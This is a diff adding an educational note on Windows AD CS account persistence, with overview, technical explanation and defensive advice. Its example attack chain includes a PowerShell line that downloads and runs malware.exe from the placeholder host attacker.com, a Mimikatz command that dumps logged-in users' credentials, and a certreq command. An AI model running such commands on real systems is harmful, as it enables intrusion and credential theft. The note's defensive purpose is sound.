@@ -1,0 +1,82 @@
+# Windows AD CS Account Persistence
+
+
+# 👉 Overview
+
+---
+
+### 👀 What ?
+
+> Windows AD CS Account Persistence is a technique where an attacker gains persistence in a network through the Active Directory Certificate Services (AD CS). AD CS is a Windows Server role that allows organizations to create and manage public key certificates used in software security systems that employ public key technologies. When improperly configured, an attacker with sufficient privileges can abuse this service to generate certificates, impersonating any user and gaining control over the network.
+> 
+
+### 🧐 Why ?
+
+> Understanding Windows AD CS Account Persistence is crucial for both IT administrators and cybersecurity professionals. For IT administrators, understanding this technique can help them configure the AD CS properly, reducing the risk of an attacker gaining persistence in the network. For cybersecurity professionals, understanding this technique can help them detect and respond to such attacks more effectively. Additionally, as Active Directory is widely used in business environments, this technique is particularly relevant to those working in or with corporate networks.
+> 
+
+### ⛏️ How ?
+
+> To implement Windows AD CS Account Persistence, an attacker would first need to gain initial access to the network, likely through another attack vector. Once they have sufficient privileges, they can abuse the AD CS to generate a certificate for any user in the network. This certificate can then be used to authenticate as that user, giving the attacker their privileges. To protect against this, IT administrators should ensure that only trusted, necessary users have the ability to generate certificates. Regular monitoring and auditing of certificate generation and usage can also help to detect any misuse.
+> 
+
+### ⏳ When ?
+
+> The use of Windows AD CS Account Persistence has been seen in various real-world attacks, particularly those targeting large organizations. However, the concept of abusing certificate services for persistence is not a new one and has been a known risk in cybersecurity for many years.
+> 
+
+# ⚙️ Technical Explanations
+
+---
+
+Windows AD CS Account Persistence is a technique involving the misuse of the Active Directory Certificate Services (AD CS) role in Windows Server. AD CS is a server role that allows organizations to create and manage public key certificates used in software security systems that employ public key technologies.
+
+In this technique, an attacker who has gained sufficient privileges can abuse the service to generate certificates. These certificates can be generated for any user in the Active Directory through the use of the Certificate Authority (CA) and Certificate Templates. The CA is a trusted entity that issues digital certificates, which certify the ownership of a public key by the named subject of the certificate. Certificate Templates define the format and content of a certificate based on its intended usage.
+
+The attacker can then impersonate another user by using the generated certificate to authenticate as that user, therefore gaining their privileges. This process allows the attacker to maintain a persistent presence in the network, which can be very challenging to detect and remove.
+
+To protect against this, IT administrators need to ensure proper configuration of the AD CS. This includes limiting the ability of users to generate certificates to only those who are trusted and require this capability for their role. Furthermore, it is necessary to regularly monitor and audit certificate generation and usage to detect any potential misuse. Regularly updating and patching the Windows Server can also help to prevent known vulnerabilities from being exploited.
+
+Understanding this technique is crucial for IT administrators and cybersecurity professionals. For IT administrators, it can help them properly configure the AD CS to reduce the risk of an attacker gaining persistence in the network. For cybersecurity professionals, it can assist in detecting and responding to such attacks more effectively.
+
+This technique has been observed in real-world attacks, particularly those targeting large organizations. However, the concept of abusing certificate services for persistence is not new and has been a known risk in cybersecurity for many years.
+
+An example of Windows AD CS Account Persistence might look like the following:
+
+1. **Initial Access**: An attacker gains access to a network, perhaps through a phishing attack targeting an employee's email account. The attacker might use a tool like PowerShell to execute their commands:
+    
+    ```powershell
+    Invoke-WebRequest -Uri <http://attacker.com/malware.exe> -OutFile C:\\temp\\malware.exe
+    Start-Process "C:\\temp\\malware.exe"
+    
+    ```
+    
+    The above command downloads a malicious executable from the attacker's server and runs it.
+    
+2. **Privilege Escalation**: The attacker then needs to elevate their privileges. They might exploit a known vulnerability or use a tool like Mimikatz to extract credentials:
+    
+    ```powershell
+    Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
+    
+    ```
+    
+    This command dumps the credentials of logged-in users.
+    
+3. **AD CS Misuse**: Now with sufficient privileges, the attacker can create a certificate. They might use certreq, a command-line utility in Windows:
+    
+    ```powershell
+    certreq -new request.inf certname.cer
+    
+    ```
+    
+    The above command generates a new certificate request based on the settings in the `request.inf` file and outputs the certificate to `certname.cer`.
+    
+4. **Persistence**: The attacker can now use the generated certificate to authenticate as another user, maintaining their presence in the network.
+
+To defend against such an attack, IT administrators should:
+
+- Limit certificate creation permissions to trusted users
+- Regularly audit and monitor certificate creation and usage
+- Patch Windows Servers regularly to prevent known vulnerabilities from being exploited
+
+This is a simplified example. Real-world attacks can be much more complex, using a variety of tools and methods to avoid detection.
